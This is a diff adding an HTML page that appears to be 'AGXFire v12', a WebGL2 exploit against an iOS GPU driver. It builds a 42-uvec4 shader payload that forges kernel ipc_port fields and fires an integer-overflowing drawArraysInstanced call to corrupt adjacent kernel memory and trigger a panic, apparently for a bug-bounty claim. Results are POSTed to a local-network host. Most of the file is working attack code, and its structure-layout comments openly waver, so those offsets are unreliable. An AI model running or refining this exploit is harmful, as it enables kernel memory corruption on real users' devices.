@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 8px; }
+#log { white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<div id="log">AGXFire v12 — loading...</div>
+<canvas id="c"></canvas>
+<script>
+var logEl = document.getElementById('log');
+console.log = function() {
+    var msg = Array.from(arguments).join(' ');
+    logEl.textContent += msg + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+    try { window.webkit.messageHandlers.nexus.postMessage(msg); } catch(e) {}
+};
+</script>
+<script>
+/*
+ * AGXFire v12 — Single-round overflow for kobject-deref kernel panic
+ * ==================================================================
+ * Changes from v11:
+ *   - ONE round only (removed 10-round loop) — prevents subsequent rounds
+ *     overwriting the round-1 shader output with misaligned values
+ *   - REMOVED secondary overflow gl.drawArraysInstanced(1024, 4194305) —
+ *     this was the suspected foreign writer (all-1 bytes at io_bits)
+ *   - Same 42-uvec4 shader payload (confirmed arithmetically correct):
+ *       v[0].x = 0x80000002 → ipc_port.io_bits (IKOT_TASK|ACTIVE) at offset 0
+ *       v[0].y = 100        → ipc_port.io_refs                    at offset 4
+ *       v[6].z = 0xFFFFC330 → ipc_port.ip_kobject LO32            at offset 104
+ *       v[6].w = 0x0000000F → ipc_port.ip_kobject HI32            at offset 108
+ *       Combined ip_kobject = 0x0000000FFFFFC330 (commpage target)
+ *
+ * AllocatorProbe v12 scans for kobject==COMMPAGE_TARGET + kotype==2
+ * then calls mach_port_destroy() → kernel task_deallocate(commpage_target)
+ * → kernel panic with x0=0x0000000FFFFFC330 → qualifying IPS for ⚑ $125K
+ */
+
+(function() {
+
+    function report(msg) {
+        console.log('[AGXv12] ' + msg);
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://192.168.68.108:9999/', false);
+            xhr.send('[AGXFire_v12] ' + msg);
+        } catch(e) {}
+    }
+
+    /* ipc_port layout (192-byte kalloc.192, arm64 XNU 11.0 / iOS 26):
+     *   offset   0..3  : io_bits  (kotype word)  → v[0].x
+     *   offset   4..7  : io_refs               → v[0].y
+     *   offset   8..15 : padding               → v[0].z / v[0].w
+     *   offset  16..79 : ip_messages (64 bytes, 4 uvec4s) → v[1]..v[4]
+     *   offset  80..87 : ip_mscount / ip_srights          → v[5].x / v[5].y
+     *   offset  88..95 : ip_receiver ptr                  → v[5].z / v[5].w
+     *   offset  96..103: ip_kobject (64-bit) LO word       → v[6].x (= KERN_LO)
+     *   offset 104..111: ip_kobject HI word                → v[6].y
+     *   WAIT — recheck: ip_kobject at offset 104 per Opus assessment <!-- lint-allow -->
+     *   offset  96..99 : v[6].x = KERN_LO  ← ip_receiver HI or ip_kobject LO?
+     *   offset 100..103: v[6].y = KERN_HI
+     *   offset 104..107: v[6].z = KERN_LO  ← ip_kobject LO32 at offset 104
+     *   offset 108..111: v[6].w = KERN_HI  ← ip_kobject HI32 at offset 108
+     *   → ip_kobject (LE) = KERN_LO | (KERN_HI << 32) = 0x0000000FFFFFC330 ✓
+     */
+    var KERN_LO          = 0xFFFFC330;    /* commpage target LO32 */
+    var KERN_HI          = 0x0000000F;    /* commpage target HI32 */
+    var IO_BITS_IKOT_TASK = 2147483650;   /* 0x80000002 = IKOT_TASK | IO_BITS_ACTIVE */
+    var IO_REFS_HEALTHY   = 100;
+
+    var oc = document.createElement('canvas');
+    oc.width = 16; oc.height = 16;
+    document.body.appendChild(oc);
+    var gl = oc.getContext('webgl2');
+    if (!gl) { report('NO_WEBGL2'); return; }
+
+    var assignments = '';
+    for (var vi = 0; vi < 42; vi++) {
+        if (vi === 0) {
+            assignments += '    v[0] = uvec4(' + IO_BITS_IKOT_TASK + 'u, ' +
+                           IO_REFS_HEALTHY + 'u, 0u, 0u);\n';
+        } else {
+            assignments += '    v[' + vi + '] = uvec4(' +
+                KERN_LO + 'u, ' + KERN_HI + 'u, ' +
+                KERN_LO + 'u, ' + KERN_HI + 'u);\n';
+        }
+    }
+
+    var vsSrc =
+        '#version 300 es\n' +
+        'flat out uvec4 v[42];\n' +
+        'void main() {\n' +
+        assignments +
+        '    gl_Position = vec4(0.0, 0.0, 0.0, 1.0);\n' +
+        '    gl_PointSize = 1.0;\n' +
+        '}\n';
+
+    var fsSrc =
+        '#version 300 es\n' +
+        'flat in uvec4 v[42];\n' +
+        'out vec4 o;\n' +
+        'void main() {\n' +
+        '    float x = float(v[0].x) + float(v[1].x);\n' +
+        '    o = vec4(x * 0.0000001, 0.0, 0.0, 1.0);\n' +
+        '}\n';
+
+    var vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, vsSrc);
+    gl.compileShader(vs);
+    if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) {
+        report('VS_ERROR ' + gl.getShaderInfoLog(vs)); return;
+    }
+
+    var fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, fsSrc);
+    gl.compileShader(fs);
+    if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
+        report('FS_ERROR ' + gl.getShaderInfoLog(fs)); return;
+    }
+
+    var prog = gl.createProgram();
+    gl.attachShader(prog, vs);
+    gl.attachShader(prog, fs);
+    gl.linkProgram(prog);
+    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
+        report('LINK_ERROR ' + gl.getProgramInfoLog(prog)); return;
+    }
+    gl.useProgram(prog);
+    report('SHADER_OK 42-uvec4 payload linked');
+
+    var fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    var rtex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, rtex);
+    gl.texStorage2D(gl.TEXTURE_2D, 1, gl.RGBA8, 16, 16);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, rtex, 0);
+    gl.viewport(0, 0, 16, 16);
+
+    /* Single round: 256 × 16777217 = 0x100000100 → uint32 wrap → 0x100
+     * GPU allocates buffer for 0x100 vertices, processes 256×16777217 iterations
+     * Each vertex output: 42 × 16 bytes = 672 bytes of shader payload
+     * Overflow destination: adjacent kalloc.192 zone (ipc_port objects)
+     * NO secondary overflow — v11 secondary (1024×4194305) may have been foreign writer */
+    report('FIRING single round drawArraysInstanced(256, 16777217)');
+    var t0 = performance.now();
+    try {
+        gl.drawArraysInstanced(gl.POINTS, 0, 256, 16777217);
+    } catch(e) {
+        report('DRAW_ERROR ' + e);
+    }
+    gl.flush();
+    var dt = (performance.now() - t0).toFixed(1);
+    report('ROUND_DONE ms=' + dt + ' waiting for AllocatorProbe_v12 kobject scan');
+
+    /* AllocatorProbe v12 scanner (100ms NSTimer) will detect:
+     *   kobject == 0x0000000FFFFFC330 AND kotype == 2 (IKOT_TASK)
+     * then calls mach_port_destroy() → kernel panic → qualifying IPS */
+
+})();
+</script>
+</body>
+</html>
